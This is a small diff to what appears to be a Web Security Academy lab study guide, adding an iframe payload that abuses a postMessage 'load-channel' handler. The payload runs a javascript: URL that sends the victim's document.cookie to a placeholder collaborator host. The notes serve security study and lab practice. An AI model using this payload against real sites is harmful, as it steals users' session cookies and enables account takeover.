@@ -294,7 +294,14 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
     "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
 }), "*");'>
 
-```  
+```
+
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location=\'https://COLLABORATOR.com?c='+document.cookie+'\'"
+}), "*");'>
+```
 
 >At the end of the iframe onload values is a "*", this is to indicate the target is any.  
   
